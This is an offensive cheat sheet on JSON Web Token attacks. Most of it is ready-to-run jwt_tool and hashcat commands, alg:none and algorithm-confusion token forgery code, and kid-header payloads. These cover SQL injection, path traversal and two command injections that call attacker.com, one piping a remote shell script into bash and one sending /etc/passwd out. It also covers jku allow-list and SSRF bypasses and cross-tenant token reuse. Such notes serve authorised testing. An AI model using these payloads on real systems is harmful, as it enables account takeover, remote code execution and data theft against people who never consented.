---
tags:
  - high
  - logic
---

# JWT Vulnerabilities

## TL;DR

JWT attacks exploit weak signature validation, algorithm confusion, and secret brute-forcing to forge tokens.

```bash
# Test all attacks at once
python3 jwt_tool.py -M at -t "https://target.com/api/user" \
  -rh "Authorization: Bearer eyJhbG..."
```

---

## JWT Structure

```
header.payload.signature (Base64url encoded)

eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature
```

**Common Locations:**
- `Authorization: Bearer <JWT>`
- `Cookie: session=<JWT>`
- `X-Auth-Token: <JWT>`
- URL parameter: `?token=<JWT>`

---

## Exploitation

### 1. Signature Not Verified

Modify payload, keep same signature:

```bash
# If accepted, signature not checked
python3 jwt_tool.py <JWT> -I -pc user -pv admin
```

### 2. None Algorithm Attack

```bash
python3 jwt_tool.py <JWT> -X a
```

**Manual:**
```json
{"alg":"none","typ":"JWT"}
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
{"alg":"nOnE","typ":"JWT"}
```

Remove signature:
```
eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

### 3. Algorithm Confusion (RS256 → HS256)

Server expects RS256 (asymmetric), we trick it to use HS256 with public key as secret.

```bash
# Get public key
openssl s_client -connect target.com:443 | openssl x509 -pubkey -noout > pub.pem

# Sign with public key as HMAC secret
python3 jwt_tool.py <JWT> -X k -pk pub.pem
```

### 4. Weak Secret Brute Force

```bash
# jwt_tool
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# hashcat (faster)
hashcat -a 0 -m 16500 jwt.txt rockyou.txt

# john
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
```

**Once cracked:**
```bash
python3 jwt_tool.py <JWT> -S hs256 -p "cracked_secret" -pc user -pv admin
```

### 5. JWK Header Injection

Embed attacker's key in token:

```bash
python3 jwt_tool.py <JWT> -X i
```

### 6. JKU/X5U Header Injection

Host malicious JWKS:

```bash
# Generate key pair
python3 jwt_tool.py -V -js JWKS

# Host at attacker server
# Modify jku in token
python3 jwt_tool.py <JWT> -X s -ju https://attacker.com/jwks.json
```

### 7. Kid Parameter Injection

**Path traversal:**
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

**SQL injection:**
```json
{"kid": "key1' UNION SELECT 'attacker_secret' --"}
```

**Command injection:**
```json
{"kid": "/dev/null; curl https://attacker.com/shell.sh | bash"}
```

### 8. Expiration Bypass

```bash
# Set exp to far future
python3 jwt_tool.py <JWT> -S hs256 -p "secret" -pc exp -pv 9999999999
```

### 9. Cross-Service Token Reuse

```http
# Token from service-a used on service-b
GET https://service-b.target.com/api/user
Authorization: Bearer <TOKEN_FROM_SERVICE_A>
```

---

## Key Claims to Check

```json
{
  "alg": "HS256",     // Algorithm - can be manipulated
  "typ": "JWT",
  "kid": "key-id",    // Key identifier - injection target
  "jku": "https://...", // JWK Set URL - can point to attacker
  "x5u": "https://..."  // X.509 cert URL - can point to attacker
}
```

**Payload claims:**
```json
{
  "sub": "1234567890",  // Subject (user ID)
  "name": "John Doe",
  "admin": false,       // Privilege - try changing
  "iat": 1516239022,
  "exp": 1516242622     // Expiration
}
```

---

## Checklist

- [ ] Decode token, identify sensitive claims
- [ ] Modify payload, test if signature validated
- [ ] Try alg:none attack
- [ ] If RS256, try algorithm confusion
- [ ] Brute force HMAC secret
- [ ] Test JWK/JKU/X5U injection
- [ ] Check kid parameter for injection
- [ ] Test token expiration enforcement
- [ ] Look for cross-service token reuse
- [ ] Search for secrets in JS bundles/configs

---

## Tools

- **[jwt_tool](https://github.com/ticarpi/jwt_tool)** — All-in-one JWT testing
- **[Burp JWT Editor](https://portswigger.net/bappstore/f923cbf91698420890354c1d8958fee6)** — Visual manipulation
- **[jwt.io](https://jwt.io)** — Online decoder
- **hashcat** — GPU secret cracking

---

## Advanced Attack Techniques

### Algorithm Confusion (RS256 → HS256)

**Vulnerability:** Server accepts multiple algorithms, public key exposed in JWKS.

**Exploit Flow:**
1. Server expects RS256 (asymmetric: private key signs, public key verifies)
2. Attacker retrieves public key from `/.well-known/jwks.json`
3. Attacker changes `alg` to HS256 (symmetric: same key for sign + verify)
4. Server uses public key as HMAC secret
5. Token validated successfully

**Automated:**
```bash
# Get JWKS and extract public key
curl https://target/.well-known/jwks.json | jq -r '.keys[0]'

# Generate forged token
python3 jwt_tool.py <JWT> -X k -pk public.pem
```

**Manual (Python):**
```python
import jwt
import requests
from cryptography.hazmat.primitives import serialization

# 1. Fetch JWKS
jwks = requests.get("https://target/.well-known/jwks.json").json()

# 2. Convert to PEM (or use existing PEM)
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# 3. Sign with public key as HMAC secret
payload = {"sub": "admin", "role": "admin"}
forged_token = jwt.encode(payload, public_key, algorithm="HS256")

# 4. Use forged token
headers = {"Authorization": f"Bearer {forged_token}"}
requests.get("https://target/api/admin", headers=headers)
```

### Kid (Key ID) Injection

**SQL Injection:**
```json
{
  "alg": "HS256",
  "kid": "key1' UNION SELECT 'attacker_secret' FROM secrets--"
}
```

Server query:
```sql
SELECT key FROM keys WHERE kid = 'key1' UNION SELECT 'attacker_secret'--'
```

**Path Traversal:**
```json
{
  "alg": "HS256",
  "kid": "../../../../../../dev/null"
}
```

Sign with empty secret (contents of `/dev/null`):
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""
```

**Template Injection (SSTI):**
```json
{
  "alg": "HS256",
  "kid": "{{7*7}}"  // Or: ${7*7}, <%=7*7%>
}
```

**Command Injection:**
```json
{
  "alg": "HS256",
  "kid": "key; curl https://attacker.com/$(cat /etc/passwd | base64)"
}
```

### JKU/X5U Header Abuse

**JKU (JWK Set URL):**
```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/jwks.json",
  "kid": "attacker-key"
}
```

**Attacker's JWKS:**
```json
{
  "keys": [{
    "kty": "RSA",
    "kid": "attacker-key",
    "use": "sig",
    "n": "attacker_public_key_n...",
    "e": "AQAB"
  }]
}
```

**Bypass Attempts:**
```json
// Domain whitelist bypass
{"jku": "https://attacker.com@target.com/jwks.json"}
{"jku": "https://target.com.attacker.com/jwks.json"}
{"jku": "https://target.com/redirect?url=https://attacker.com/jwks.json"}

// SSRF to internal JWKS
{"jku": "http://localhost:8080/admin/jwks.json"}
```

**X5U (X.509 URL) - Similar:**
```json
{
  "alg": "RS256",
  "x5u": "https://attacker.com/cert.pem"
}
```

**JWK Header Embedding:**
```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "attacker_key_modulus",
    "e": "AQAB"
  }
}
```

Sign with corresponding private key → self-signed token accepted.

### Cross-Service Token Confusion

**Token Type Confusion:**
```
OIDC Flow:
1. /authorize → ID Token (user identity)
2. /token → Access Token (API permissions)

Vulnerability: Backend accepts ID token as access token
```

**Exploit:**
```http
# Get ID token from login
POST /oauth/token
grant_type=authorization_code&code=...

Response: 
{
  "id_token": "eyJhbG...",  // For identity
  "access_token": "eyJhbG..."  // For API
}

# Use ID token on API (should fail, often doesn't)
GET /api/admin/users
Authorization: Bearer <id_token>
```

**Audience (aud) Bypass:**
```json
// Token issued for service-a
{
  "aud": "service-a.target.com",
  "sub": "admin",
  "role": "admin"
}

// Used on service-b (should reject, often accepts)
GET https://service-b.target.com/api/admin
Authorization: Bearer <token_for_service_a>
```

**Cross-Tenant Exploitation:**
```python
# Multi-tenant SaaS
# 1. Get token for tenant-A
login_resp = requests.post("https://target/login", json={
    "tenant": "tenant-a",
    "username": "attacker",
    "password": "pass123"
})
token = login_resp.json()['token']

# 2. Use on tenant-B endpoint
headers = {"Authorization": f"Bearer {token}"}
requests.get("https://target/tenant-b/api/users", headers=headers)
# If no tenant validation in token → access granted
```

**Service Mesh Confusion:**
```
Internal services trust tokens without re-validation:
1. Get valid token from public API
2. Access internal service directly
3. Internal service trusts token without checking issuer/audience
```

### JWKS Caching Race Condition

```
Key Rotation Scenario:
T0: Key compromised, rotation initiated
T1: New key published to JWKS endpoint
T2: Old key still in application cache (TTL: 5 mins)
T3: Attacker signs with old (compromised) key
T4: Cache hit → token validated with old key → success
```

**Exploitation:**
```bash
# Monitor JWKS endpoint
while true; do 
    curl -s https://target/.well-known/jwks.json | jq '.keys[].kid'
    sleep 1
done

# When rotation detected, quickly use old key
jwt_tool <old_token> -S rs256 -pr compromised_key.pem -pc role -pv admin
```

### Signature Stripping Variations

**Truncated Signature:**
```
Normal: header.payload.signature
Attack: header.payload.
```

**Empty Signature:**
```
header.payload.""
```

**Case Variations:**
```json
{"alg": "None"}
{"alg": "NONE"}
{"alg": "nOnE"}
{"alg": "NoNe"}
```

### Practical Testing Workflow

```bash
# 1. Decode and analyze
jwt_tool <TOKEN>

# 2. Run all attacks automatically
jwt_tool <TOKEN> -M at -t "https://target/api/user" -rh "Authorization: Bearer TOKEN"

# 3. Manual testing priority:
# - None algorithm
# - RS256→HS256 (if JWKS available)
# - kid injection (SQL, path traversal)
# - Signature not verified
# - Secret brute force
# - Cross-service reuse
# - jku/x5u injection

# 4. Confirm with specific payload modification
jwt_tool <TOKEN> -I -pc role -pv admin
```

### Real-World Patterns

**Look for:**
- `/.well-known/jwks.json` - Public keys for RS256→HS256
- `/oauth/token`, `/auth/token` - Token issuance endpoints
- Multiple services sharing auth - Cross-service confusion
- React/Vue apps - Secrets in bundle.js
- Swagger/OpenAPI - Auth flows documented
- `/healthz`, `/debug` endpoints - Exposed config with secrets
